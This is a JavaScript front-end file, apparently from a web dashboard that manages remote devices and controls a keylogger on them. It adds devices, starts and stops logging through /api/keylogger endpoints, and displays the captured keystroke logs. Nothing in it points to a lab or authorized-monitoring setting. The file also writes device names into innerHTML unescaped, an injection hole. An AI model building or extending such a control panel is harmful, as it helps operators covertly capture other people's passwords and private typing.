class DeviceManager {
    constructor() {
        this.devices = new Map();
        this.initializeEventListeners();
    }

    initializeEventListeners() {
        document.getElementById('connect-device').addEventListener('click', () => this.connectDevice());
        
        // Show devices section when macOS is selected
        document.addEventListener('osSelected', (event) => {
            if (event.detail.os === 'macos') {
                document.getElementById('devices').style.display = 'block';
                this.loadDevices();
            }
        });
    }

    async loadDevices() {
        try {
            const response = await fetch('/api/devices');
            const devices = await response.json();
            devices.forEach(device => this.addDeviceToUI(device));
        } catch (error) {
            console.error('Error loading devices:', error);
        }
    }

    async connectDevice() {
        try {
            const response = await fetch('/api/devices/connect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ os: sessionStorage.getItem('selectedOS') })
            });
            const device = await response.json();
            this.addDeviceToUI(device);
        } catch (error) {
            console.error('Error connecting device:', error);
        }
    }

    createDeviceElement(device) {
        const deviceEl = document.createElement('div');
        deviceEl.className = 'device-item';
        deviceEl.dataset.deviceId = device.id;
        deviceEl.innerHTML = `
            <div class="device-info">
                <input type="radio" name="selected-device" id="device-${device.id}" class="device-selector">
                <label for="device-${device.id}">
                    <span class="device-name">${device.name}</span>
                    <span class="device-status ${device.status}">${device.status}</span>
                </label>
            </div>
            <div class="device-controls">
                <button class="control-btn start-logger" ${device.status === 'logging' ? 'disabled' : ''}>
                    <i class="fas fa-play"></i> Start
                </button>
                <button class="control-btn stop-logger" ${device.status !== 'logging' ? 'disabled' : ''}>
                    <i class="fas fa-stop"></i> Stop
                </button>
                <button class="control-btn view-logs">
                    <i class="fas fa-eye"></i> View Logs
                </button>
                <button class="control-btn remove-device">
                    <i class="fas fa-trash"></i> Remove
                </button>
            </div>
        `;

        // Add selection handler
        const radioInput = deviceEl.querySelector(`#device-${device.id}`);
        radioInput.addEventListener('change', () => {
            if (radioInput.checked) {
                this.selectDevice(device.id);
                // Update selected device visual state
                document.querySelectorAll('.device-item').forEach(item => {
                    item.classList.remove('selected');
                });
                deviceEl.classList.add('selected');
            }
        });

        // Check if this device was previously selected
        const currentDeviceId = sessionStorage.getItem('currentDeviceId');
        if (currentDeviceId === device.id) {
            radioInput.checked = true;
            deviceEl.classList.add('selected');
        }

        this.attachDeviceListeners(deviceEl, device.id);
        return deviceEl;
    }

    attachDeviceListeners(deviceEl, deviceId) {
        const startBtn = deviceEl.querySelector('.start-logger');
        const stopBtn = deviceEl.querySelector('.stop-logger');
        const viewBtn = deviceEl.querySelector('.view-logs');
        const removeBtn = deviceEl.querySelector('.remove-device');

        startBtn.addEventListener('click', (e) => {
            e.stopPropagation(); // Prevent device selection
            this.startLogging(deviceId);
        });

        stopBtn.addEventListener('click', (e) => {
            e.stopPropagation(); // Prevent device selection
            this.stopLogging(deviceId);
        });

        viewBtn.addEventListener('click', (e) => {
            e.stopPropagation(); // Prevent device selection
            this.viewLogs(deviceId);
        });

        removeBtn.addEventListener('click', async (e) => {
            e.stopPropagation(); // Prevent device selection
            await this.removeDevice(deviceId);
        });
    }

    async startLogging(deviceId) {
        try {
            const response = await fetch(`/api/keylogger/${deviceId}/start`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            });
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            const result = await response.json();
            if (result.message === 'Keylogger started successfully') {
                this.updateDeviceStatus(deviceId, 'logging');
            }
        } catch (error) {
            console.error('Error starting logger:', error);
            alert('Failed to start logging: ' + error.message);
        }
    }

    async stopLogging(deviceId) {
        try {
            const response = await fetch(`/api/keylogger/${deviceId}/stop`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            });
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            const result = await response.json();
            if (result.message === 'Keylogger stopped successfully') {
                this.updateDeviceStatus(deviceId, 'connected');
            }
        } catch (error) {
            console.error('Error stopping logger:', error);
            alert('Failed to stop logging: ' + error.message);
        }
    }

    async viewLogs(deviceId) {
        try {
            console.log('Fetching logs for device:', deviceId);
            const response = await fetch(`/api/logs?device=${deviceId}`);
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            const data = await response.json();
            console.log('Received logs data:', data);
            
            // Update the logs display
            const output = document.getElementById('keylogger-output');
            if (output) {
                if (Array.isArray(data.logs)) {
                    output.textContent = data.logs.join('\n') || 'No logs available';
                } else {
                    output.textContent = 'Invalid logs format received';
                }
                console.log('Updated output with logs');
            } else {
                console.error('Could not find keylogger-output element');
            }
        } catch (error) {
            console.error('Error viewing logs:', error);
            
            // Get more details about the error
            if (error.response) {
                console.error('Response:', await error.response.text());
            }
            
            const output = document.getElementById('keylogger-output');
            if (output) {
                output.textContent = 'Error loading logs: ' + error.message;
                output.style.color = 'red';
            }
        }
    }

    async removeDevice(deviceId) {
        try {
            // First stop the keylogger if it's running
            const deviceEl = document.querySelector(`[data-device-id="${deviceId}"]`);
            const status = deviceEl?.querySelector('.device-status')?.textContent;
            
            if (status === 'logging') {
                await this.stopLogging(deviceId);
            }

            // Then remove the device
            const response = await fetch(`/api/devices/${deviceId}`, {
                method: 'DELETE',
                headers: { 'Content-Type': 'application/json' }
            });
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            // Remove from UI
            if (deviceEl) {
                deviceEl.remove();
            }
            
            // Remove from internal map
            this.devices.delete(deviceId);
            
            // Clear current device if it was the one removed
            if (sessionStorage.getItem('currentDeviceId') === deviceId) {
                sessionStorage.removeItem('currentDeviceId');
                // Clear the logs display
                const output = document.getElementById('keylogger-output');
                if (output) {
                    output.textContent = 'No device selected';
                }
            }

            // Show success message
            const message = document.createElement('div');
            message.className = 'alert alert-success';
            message.textContent = 'Device removed successfully';
            document.getElementById('device-list').prepend(message);
            
            // Remove the message after 3 seconds
            setTimeout(() => message.remove(), 3000);
            
        } catch (error) {
            console.error('Error removing device:', error);
            alert('Failed to remove device: ' + error.message);
        }
    }

    updateDeviceStatus(deviceId, status) {
        const deviceEl = document.querySelector(`[data-device-id="${deviceId}"]`);
        if (deviceEl) {
            const statusEl = deviceEl.querySelector('.device-status');
            statusEl.className = `device-status ${status}`;
            statusEl.textContent = status;

            const startBtn = deviceEl.querySelector('.start-logger');
            const stopBtn = deviceEl.querySelector('.stop-logger');
            startBtn.disabled = status === 'logging';
            stopBtn.disabled = status !== 'logging';
        }
    }

    addDeviceToUI(device) {
        const deviceEl = this.createDeviceElement(device);
        deviceEl.dataset.deviceId = device.id;
        document.getElementById('device-list').appendChild(deviceEl);
        this.devices.set(device.id, device);
    }

    selectDevice(deviceId) {
        console.log('Selecting device:', deviceId);
        sessionStorage.setItem('currentDeviceId', deviceId);
        currentDeviceId = deviceId;  // Update the global variable
        
        const event = new CustomEvent('deviceSelected', {
            detail: { deviceId }
        });
        document.dispatchEvent(event);
    }
}

// Initialize device manager when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.deviceManager = new DeviceManager();
}); 